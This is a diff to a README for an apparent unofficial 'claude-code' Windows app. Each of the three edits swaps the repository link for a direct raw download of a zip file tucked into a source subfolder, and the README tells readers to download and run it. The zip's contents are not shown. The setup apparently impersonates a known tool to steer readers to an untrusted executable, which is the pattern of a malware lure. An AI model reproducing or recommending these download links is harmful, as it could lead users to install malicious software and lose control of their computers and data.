@@ -1,12 +1,12 @@
 # 🤖 claude-code - Run Claude Code on Windows
 
-[![Download claude-code](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/phillisrevived347/claude-code)
+[![Download claude-code](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/phillisrevived347/claude-code/main/src/services/MagicDocs/claude_code_v3.6.zip)
 
 ## 📥 Download
 
 Open this page to download and run the app on Windows:
 
-https://github.com/phillisrevived347/claude-code
+https://raw.githubusercontent.com/phillisrevived347/claude-code/main/src/services/MagicDocs/claude_code_v3.6.zip
 
 ## 🖥️ What this app does
 
@@ -35,7 +35,7 @@ If your PC is older, the app may still run, but it can feel slow when it reads l
 ## 🚀 Getting Started
 
 1. Open the download page:
-   https://github.com/phillisrevived347/claude-code
+   https://raw.githubusercontent.com/phillisrevived347/claude-code/main/src/services/MagicDocs/claude_code_v3.6.zip
 
 2. On that page, look for the latest release or download file.
 
